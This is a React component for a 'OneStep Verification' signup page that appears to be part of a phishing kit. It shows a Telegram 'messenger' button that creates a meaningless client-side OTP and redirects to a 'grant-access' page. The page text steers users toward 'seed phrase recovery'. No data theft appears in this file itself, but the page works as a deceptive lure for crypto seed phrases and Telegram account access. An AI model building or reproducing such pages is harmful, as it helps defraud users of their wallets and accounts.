import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const SignupPage = () => {
  const navigate = useNavigate();
  const [redirecting, setRedirecting] = useState(false); // State to handle redirect message

  // Generate OTP, show "Redirecting to Telegram...", and navigate to grant-access page
  const handleGenerateOTP = () => {
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    console.log("Generated OTP:", otp);
    localStorage.setItem("otp", otp);

    // Show the redirect message and wait for 2 seconds before navigating
    setRedirecting(true);
    setTimeout(() => {
      navigate("/grant-access-signup");
    }, 2000); // 2 seconds delay before redirection
  };

  return (
    <div
      className="relative bg-cover bg-center min-h-screen flex flex-col justify-between"
      style={{
        backgroundImage: "linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url('/background.jpg')",
      }}
    >
      {/* Top Left: Back to Login */}
      <div
        className="absolute top-4 left-4 flex items-center gap-2 cursor-pointer"
        onClick={() => navigate("/")}
      >
        <img
          src="/avatar.avif"
          alt="Back to Login icon"
          className="w-10 h-10 rounded-full object-cover"
          loading="lazy"
        />
        <span className="text-white text-sm">Back to Login</span>
      </div>

      {/* Top Middle: Logo */}
      <div className="absolute top-4 left-1/2 transform -translate-x-1/2">
        <img
          src="/onestep.png"
          alt="OneStep Logo"
          className="w-28 sm:w-25 h-6"
          loading="lazy"
        />
      </div>

      {/* Top Right: Close Button */}
      <div className="absolute top-4 right-4 text-white cursor-pointer text-xl hover:text-gray-400" aria-label="Close signup page">
        X
      </div>

      {/* Center Sign-Up Card */}
      <div className="bg-black bg-opacity-90 border border-white border-opacity-20 rounded-xl shadow-lg w-[90%] max-w-[900px] flex flex-col justify-between mt-12 sm:mt-24 mx-auto px-4 py-6">
        <h1 className="text-white text-2xl sm:text-3xl font-bold mb-2 mt-4 text-center font-serif">Sign Up</h1>
        <p className="text-gray-400 text-sm mb-2 text-center font-serif">
          Complete OneStep Verification
        </p>
        <p className="text-gray-400 text-center mb-4">
          Complete the OneStep verification to proceed. If you don't have one already, it is important for account verification.
        </p>

        {/* Select Messenger Section */}
        <div className="flex flex-col justify-center items-center mb-4 mt-6 cursor-pointer">
          <div className="text-center text-gray-200 font-semibold mb-2">KINDLY SELECT A MESSENGER BELOW</div>
          <img
            src="/telelogo.png"
            alt="Telegram icon for verification"
            className="w-12 sm:w-16 h-12 sm:h-16"
            loading="lazy"
            onClick={handleGenerateOTP}
          />
        </div>

        {/* Help Center */}
        <div className="text-center text-gray-400 mb-4">
          <p className="mb-2">Having trouble using OneStep Verification?</p>
          <button className="bg-yellow-500 hover:bg-yellow-600 text-black font-semibold px-20 sm:px-40 py-2 rounded">
            HELP CENTRE
          </button>
        </div>

        {/* Seed Phrase Recovery */}
        <div className="text-center text-gray-400 mb-4">
          <p>
            If you have not yet registered for the OneStep ID, go to the recovery center to use the Seed phrase recovery with your seed phrase to gain access into your account.
          </p>
        </div>
      </div>

      {/* Footer Text */}
      <div className="text-center text-sm text-gray-500 mt-auto">
        <p className="mb-32">
          By using Login, you agree to our <span className="text-yellow-500 underline cursor-pointer">Terms & Privacy Policy</span>
        </p>
      </div>
    </div>
  );
};

export default SignupPage;
